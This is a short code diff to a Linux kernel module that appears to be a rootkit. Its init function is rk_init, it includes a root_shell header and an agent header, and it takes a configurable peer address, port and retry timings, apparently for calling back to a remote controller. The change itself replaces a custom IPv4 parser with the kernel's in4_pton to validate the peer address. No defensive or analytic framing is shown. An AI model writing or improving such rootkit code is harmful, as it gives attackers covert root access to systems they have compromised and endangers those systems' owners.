@@ -2,12 +2,12 @@
 #include <linux/err.h>
 #include <linux/errno.h>
 #include <linux/hex.h>
+#include <linux/inet.h>
 #include <linux/init.h>
 #include <linux/module.h>
 #include <linux/string.h>
 
 #include "agent.h"
-#include "ipv4.h"
 #include "root_shell.h"
 
 static unsigned short peer_port;
@@ -62,8 +62,14 @@ static int __init rk_init(void)
 	__be32 peer_address;
 	int error;
 
-	error = rk_ipv4_parse(peer_address_text, &peer_address);
-	if (error || !peer_port || !retry_base_ms ||
+	{
+		const char *end;
+
+		if (!in4_pton(peer_address_text, -1, (u8 *)&peer_address,
+			      -1, &end) || *end || !peer_address)
+			return -EINVAL;
+	}
+	if (!peer_port || !retry_base_ms ||
 	    retry_base_ms > retry_max_ms || retry_max_ms > 5000)
 		return -EINVAL;
 
